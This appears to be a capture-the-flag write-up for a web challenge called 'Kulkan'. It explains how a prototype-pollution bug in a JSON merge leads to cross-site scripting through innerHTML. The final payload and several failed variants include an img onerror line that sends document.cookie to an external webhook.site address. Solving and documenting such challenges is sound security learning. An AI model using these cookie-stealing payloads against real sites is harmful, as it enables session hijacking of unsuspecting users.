Challenge name: Kulkan

Category: Web

Points: 438

Solves: 38+


### Given information

> A Messi compliment engine for Messi fans is here at penetration-testing.com

> Kulkan Security delivers penetration testing and vulnerability assessment services to International markets. Our team of security experts will plan and execute controlled attacks and partner up with your company in an effort to identify, mitigate and remediate security vulnerabilities.

### Solution

User input is to be fed into DOM via `innerHTML`. The value of `randomObject.win` is fed into a `div`'s `innerHTML` and so it must contain the script `<img onerror="fetch('https://webhook.site/abcdef?a='"+document.cookie)" src='x'>`.

`challenge.js`:

```
let randomObject = {};

// ...

let config = JSON.parse(<user input>);

let defaultConfig = { color: "blue", fontSize: "16px" };

mergeObjects(defaultConfig, config); // copies all properties from config to defaultConfig
// defaultConfig["__proto__"] = '{"win" : "xss"}' sets win for every object that exists

// ...

if (randomObject.win) {
    complimentDiv.innerHTML = randomObject.win;
}
```

Like the `Object` class which is the superclass of every class in Java, very JS object inherits the properties of the `__proto__` object. Setting `__proto__`'s  `win` property to the required script automatically includes it in  `randomObject` object.

`console.log(randomObject);` still returns `{}` but `console.log(randomObject.win);` now returns the value of the `win` property contained in `__proto__` instead of `undefined`.


Hence the payload:
```
https://www.penetration-testing.com/?input_json={"__proto__":{"win":"<p>hi</p><img onerror=fetch('https://webhook.site/abcdef?a='%2Bdocument.cookie) src=x>"}}
```

`%2B` is "+"

---

**Things that didn't work:**

- input to JSON.parse can't contain backticks or trailing comma like `{"a":1,}`
- backticks substitution like

```
\`https://webhook.site/abcdef?a=${document.cookie}\`
```
- Including all the quotes that are used while testing on console: when sent as a URL param they get encoded, for e.g. during testing

```
JSON.parse('https://www.penetration-testing.com/?input_json={"__proto__":{"win":"<p>hi</p><img onerror=fetch(\'https://webhook.site/abcdef?a=\' + document.cookie) src=\'x\'>"}}');
```
works fine but when sent in URL it turns into

```
https://www.penetration-testing.com/?input_json={"__proto__":{"win":"<p>hi</p><img onerror=fetch(\\'https://webhook.site/abcdef?a=\\' + document.cookie) src=\\'x\\'>"}}
```

Learnt to use quotes as frugally as possible.
